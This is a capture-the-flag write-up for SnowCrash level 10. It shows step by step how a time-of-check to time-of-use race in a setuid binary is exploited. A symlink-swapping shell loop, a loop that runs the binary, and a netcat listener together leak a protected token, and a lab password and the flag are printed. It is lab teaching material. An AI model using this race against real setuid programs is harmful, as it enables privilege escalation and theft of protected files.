# Level10

## How to login

```bash
ssh level10@192.168.1.184 -p 4242
password: s5cAJpM8ev6XHw998pRWG728z
```

## How to get the flag

Once logged, we have access to two files called 'level10' and 'token' (both belonging to user 'flag10'). We try to see the content of 'token' but we are not allowed since the file belongs to user 'flag10'. On the other hand, we have the binary file 'level10' that needs two arguments (being the first one the token) that presumably will give us access to the password.
```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

It is noticed that the binary has the Setuid bit set, meaning that it will be executed with the privileges of the file owner, this can be a security risk if the file is vulnerable to exploitation since an attacker could potentially exploit the file to gain the privileges of the file owner (flag10). Thanks to this we can execute 'level10'.

In order to obtain more info, we decide to run command 'ltrace' with the binary file to intercept and record dynamic library calls which are called by the executed process. 
```bash
level10@SnowCrash:~$ ltrace ./level10 token localhost
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                             = -1
printf("You don't have access to %s\n", "token"You don't have access to token
) = 31
+++ exited (status 31) +++
level10@SnowCrash:~$ 
```

It seems that 'access' is called in order to verify if the user can access to 'token'. Taking a look to 'access' man pages we find the following behavior that can be used for our exploiting purposes.
```
NOTES
       Warning:  Using  access()  to  check if a user is authorized to, for
       example, open a file before actually doing so using open(2)  creates
       a  security  hole,  because  the  user  might exploit the short time
       interval between checking and opening the  file  to  manipulate  it.
       For this reason, the use of this system call should be avoided.  (In
       the example just described, a safer alternative would be  to  tempo‐
       rarily  switch  the  process's  effective user ID to the real ID and
       then call open(2).)
```

This issue creates what is called a Time-of-Check to Time-of-Use (TOCTOU) race condition. So, if we are able to swap 'token' with our exploit in this lapsus of time between the successful call to 'access' and the call to 'open' we could have a chance to inject our exploit. This can be done by replacing the 'token' file with a symbolic link to our exploit, tricking 'level10' into opening the wrong file.

So, first of all let's create a fake token and let's try to connect with it to see the response.
```bash
level10@SnowCrash:~$ echo "This is a fake token" > /tmp/fake_token
level10@SnowCrash:~$ ./level10 /tmp/fake_token localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

As expected it doesn't work but the response gives a clue about the port that the binary attempts to connect to, which will be important later. The next step is to run a line of code that will loop indefinitely, switching continuously between the real token and our fake token.
```bash
level10@SnowCrash:~$ while true; do ln -sf /tmp/fake_token /tmp/token_link; ln -sf ~/token /tmp/token_link; done
```

The terminal will be trapped in the infinite loop, so we need to open another one, to run the binary 'level10' with the symbolic link as argument and also inside an infinite loop.
```bash
level10@SnowCrash:~$ while true; do ./level10 /tmp/token_link 192.168.1.184; done
```

The 'level10' binary will eventually open our fake token file during the race condition. Since the binary sends the file contents to a host (as suggested by its usage message), we can use 'netcat' to capture the output. When the binary opens our fake token the text 'This is a fake token' will be printed. On the other hand when the race condition is successfully exploited, we obtain the content of the real token file.
```bash
level10@SnowCrash:~$ nc -lk 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
This is a fake token
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
This is a fake token
.*( )*.
```

It seems that it worked, now we only need to obtain the flag.
```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
```